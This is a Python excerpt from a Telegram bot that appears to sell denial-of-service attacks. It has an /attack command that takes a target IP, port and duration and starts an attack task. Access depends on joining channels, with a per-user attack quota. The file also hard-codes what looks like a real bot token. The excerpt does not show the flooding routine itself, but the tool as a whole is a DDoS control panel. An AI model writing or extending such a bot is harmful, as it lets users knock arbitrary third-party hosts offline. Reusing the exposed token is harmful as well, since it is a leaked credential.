...
TELEGRAM_BOT_TOKEN = '7873604969:AAF1SImkDX0a4KzFsQwIafVKLPfN3zaP2zk'
ADMIN_USER_ID = 1604629264
CHANNELS = ['https://t.me/+lMV7mda_zTZiZTE1', 'https://t.me/+2Bmg_1a_wqFkMWY1']
attack_in_progress = {}
user_attack_count = {}
approved_users = set()
MAX_ATTACKS = 5
...
async def attack(update: Update, context: CallbackContext):
    ...
    if user_id not in approved_users:
        if not await is_member(update, context):
            join_message = "❌ Please join all required channels to use this command:\n"
            join_message += "➡️ [ Channel 1](https://t.me/+2Bmg_1a_wqFkMWY1)\n"
            join_message += "➡️ [ Channel 2](https://t.me/+lMV7mda_zTZiZTE1)"
    ...
    if len(args) != 3:
        await update.message.reply_text("*  example » /attack ip port time*", parse_mode='Markdown')
        return
    ...
    # ✅ Define `message` before passing it
    message = await update.message.reply_text(
        f"*🚀 **Attack STARTED!**\n\n🌐 IP: {ip}\n🔌 PORT: {port}\n⏰ TIME: {time} seconds",
        parse_mode='Markdown'
    )

    # ✅ Now pass `message.message_id` to `run_attack()`
    asyncio.create_task(run_attack(chat_id, ip, port, time, context, message.message_id))
...
async def broadcast(update: Update, context: CallbackContext):
    ...
    await context.bot.send_message(chat_id=CHANNEL_ID, text=f"*📢 Broadcast:* {message}", parse_mode='Markdown')
